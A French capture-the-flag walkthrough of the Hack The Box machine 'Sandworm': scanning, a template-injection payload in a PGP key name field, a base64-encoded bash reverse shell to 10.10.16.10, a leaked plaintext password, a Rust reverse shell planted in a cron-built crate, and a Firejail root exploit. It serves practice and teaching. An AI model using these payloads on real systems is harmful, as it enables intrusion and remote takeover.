# Sandworm

	echo "10.10.11.218 ssa.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.218 -e tun0 > ports.txt
	sudo nmap -p- -T4 -A 10.10.11.218 -oN nmap.txt
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    80/tcp  open  http     nginx 1.18.0 (Ubuntu)
    443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)

Fuzzing : 

    feroxbuster --silent -u http://ssa.htb
    feroxbuster --silent -k -u https://ssa.htb
    
    ffuf -H "Host: FUZZ.ssa.htb" -u https://ssa.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 8161

    ffuf -u https://ssa.htb/FUZZ -w ~/wordlists/big.txt -e .pdf,.php,.txt,.ini,.conf,.log,.html,.js,.bak,.zip


Pas mal de sous-dossiers classiques, mais certains ont l'air assez intéressants : 

    about                   [Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 135ms]
    admin                   [Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 166ms]
    contact                 [Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 117ms]
    guide                   [Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 165ms]
    login                   [Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 367ms]
    logout                  [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 300ms]
    pgp                     [Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 342ms]
    process                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 302ms]
    view                    [Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 268ms]

- La page /admin renvoie sur /login
- La page /pgp amène sur une clé publique PGP
- La page /guide permet de chiffrer, déchiffrer et vérifier des messages avec PGP

J'ai généré une clé de mon côté et j'ai chiffré un message pour tester l'application. 

Voir https://www.gnupg.org/gph/en/manual/x135.html

    gpg --gen-key
    gpg --armor --export fake@gmail.com
    echo "Message à chiffrer" | gpg --clear-sign -u fake@gmail.com
    

En copiant la clé publique et le message signé dans le dernier formulaire de la page, on a bien un message nous indiquant que la signature du message est valide : 

    Signature is valid! [GNUPG:] NEWSIG fake@gmail.com gpg: Signature made Sat 28 Oct 2023 10:37:19 AM UTC gpg: using RSA key 56E8652AB92A5039EF5B2DB721FD97AF7825B5E2 gpg: issuer "fake@gmail.com"
    ...
    Good signature from "Timothe " [unknown] [GNUPG:] VALIDSIG 56E8652AB92A5039EF5B2DB721FD97AF7825B5E2 2023-10-28 1698489439 0 4 0 1 10 01 56E8652AB92A5039EF5B2DB721FD97AF7825B5E2 [GNUPG:] TRUST_UNDEFINED 0 pgp fake@gmail.com
    
Les champs entrés au moment de la création de ma clé publique (nom + adresse mail) sont renvoyés par le site web. 

En testant différents payloads dans ces champs puis en répétant l'opération, on remarque que les expressions de type {{9*9}} sont interprétées. Le site semble donc vulnérable aux SSTI. 

En utilisant le payload suivant, on peut vérifier que l'exécution de commande fonctionne bien : 
    
    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}

En utilisant le payload suivant, on obtient bien un reverse-shell : 

    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAvOTk5OSAwPiYx | base64 -d | bash').read() }}

Le morceau en Base64 est la version encodée de ce payload : 

    sh -i >& /dev/tcp/10.10.16.10/9999 0>&1


Après réception sur mon listener, je suis bien connecté en tant que l'utilisateur "atlas"


Impossible d'écrire dans /home/atlas/.ssh/authorized_keys ou de lire dans le dossier de l'autre utilisateur ("silentobserver"), mais en fouillant dans les dossiers de notre /home on finit par tomber sur des credentials dans **~/.config/httpie/sessions/localhost_5000**

    cd ~/.config/httpie/sessions/localhost_5000
    cat admin.json
    
> "auth": {
<br>        "password": "quietLiketheWind22",
<br>        "type": null,
<br>        "username": "silentobserver"
<br>    }

    ssh silentobserver@ssa.htb
	cat user.txt	 

## Pivoting

	sudo -l
	find / -perm /4000 2>/dev/null

Deux fichiers avec SUID sortent du lot : 
- /opt/tipnet/target/debug/tipnet
- /usr/local/bin/firejail

Des exploits existent déjà pour Firejail mais l'utilisateur actuel semble ne pas avoir les droits pour capitaliser là-dessus.

Dans /opt/tipnet on remarque un fichier access.log où on voit qu'une routine est effectuée toutes les deux minutes : 

> [2023-10-28 09:32:13] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
><br> [2023-10-28 09:34:12] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.

J'ai décidé de lancer Pspy dans un deuxième shell pour vérifier si cela pouvait faire fuiter des informations :
    
    ssh silentobserver@ssa.htb
    cd /tmp
    wget http://10.10.16.10/pspy64
    chmod a+x pspy64
    ./pspy64
    
En attendant une minute ou deux, on remarque les lignes suivantes qui arrivent à l'écran : 


    2023/10/28 10:20:11 CMD: UID=0     PID=416286 | /bin/rm -r /opt/crates 
    2023/10/28 10:20:11 CMD: UID=0     PID=416287 | /bin/cp -rp /root/Cleanup/crates /opt/ 
    2023/10/28 10:20:11 CMD: UID=0     PID=416288 | /bin/bash /root/Cleanup/clean_c.sh 
    2023/10/28 10:20:59 CMD: UID=0     PID=416292 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
    2023/10/28 10:21:14 CMD: UID=1001  PID=416295 | cat /home/silentobserver/.local/bin 
    2023/10/28 10:21:21 CMD: UID=1001  PID=416298 | ls --color=auto 
    2023/10/28 10:21:26 CMD: UID=1001  PID=416299 | -bash 
    2023/10/28 10:21:31 CMD: UID=1001  PID=416300 | ls --color=auto 
    2023/10/28 10:21:50 CMD: UID=1001  PID=416301 | 
    2023/10/28 10:22:01 CMD: UID=0     PID=416303 | /usr/sbin/CRON -f -P 
    2023/10/28 10:22:01 CMD: UID=0     PID=416302 | /usr/sbin/CRON -f -P 
    2023/10/28 10:22:01 CMD: UID=0     PID=416306 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
    2023/10/28 10:22:01 CMD: UID=0     PID=416305 | 
    2023/10/28 10:22:01 CMD: UID=0     PID=416304 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline


On peut en déduire que la routine lancée toutes les deux minutes est exécutée par root mais en tant que l'utilisateur "atlas", que c'est du **Rust** et que le dossier à cibler est **/opt/crates**

Dans **/opt/crates/logger/src** il n'y a qu'un fichier lib.rs et par élimination on peut supposer que c'est lui qui sera compilé par atlas toutes les deux minutes.

On a le droit d'écriture dans ce fichier, on peut donc lui ajouter un reverse-shell Rust pour obtenir un vrai shell en tant que l'utilisateur atlas

Voir https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python 

    cd /opt/crates/logger/src
    ls -la 
    vim lib.rs
    # Copier le reverse-shell en adaptant
    cargo build
    
Attention à bien ajouter le code au début de la fonction sans supprimer le reste, attention aux points-virgules et attention aux dépendances.

Plus qu'à attendre sur la machine d'attaque et on obtient le shell : 

    rlwrap nc -nvlp 9998
    whoami

On peut cette fois écrire dans ~/.ssh/authorized_keys pour fiabiliser la connexion : 

    python3 -c "import pty ; pty.spawn('/bin/bash');" 
    echo "ssh-rsa [XXX] timothe@Kali2021" > ~/.ssh/authorized_keys
    
    ssh atlas@ssa.htb

## Élévation de privilèges

Notre utilisateur ayant maintenant les droits pour lancer Firejail, on peut reprendre l'exploit trouvé au début de la phase de pivoting.
Voir https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25 

    vim poc_firejail.py
    chmod +x poc_firejail.py
    python3 poc_firejail.py
    ...
    firejail --join=423688
    su - 
    cat /root/root.txt
    
